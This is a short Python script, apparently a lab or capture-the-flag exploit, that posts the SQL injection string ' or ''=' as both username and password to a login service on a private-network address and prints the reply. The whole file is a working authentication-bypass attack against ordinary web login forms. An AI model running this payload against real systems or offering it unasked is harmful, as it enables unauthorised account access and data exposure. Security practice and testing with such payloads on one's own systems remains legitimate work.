import requests

r = requests.post('http://192.168.0.114:5000', {'username': "' or ''='", 'password': "' or ''='"})
print(r.text)